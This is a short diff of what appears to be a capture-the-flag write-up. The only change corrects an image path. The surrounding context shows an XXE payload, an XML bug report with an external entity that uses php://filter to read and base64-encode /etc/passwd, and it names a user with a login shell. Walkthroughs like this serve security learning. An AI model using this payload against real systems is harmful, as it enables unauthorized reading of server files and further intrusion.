@@ -94,7 +94,7 @@ Try a real attack to retrieve `/etc/passwd`
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><bugreport><title>&xxe;</title><cwe></cwe><cvss></cvss><reward></reward></bugreport>
 ```
-![xxe-password-return](xxe-password-return.png)
+![xxe-password-return](/images/xxe-password-return.png)
 
 Only one user has a login shell available `development`  
 
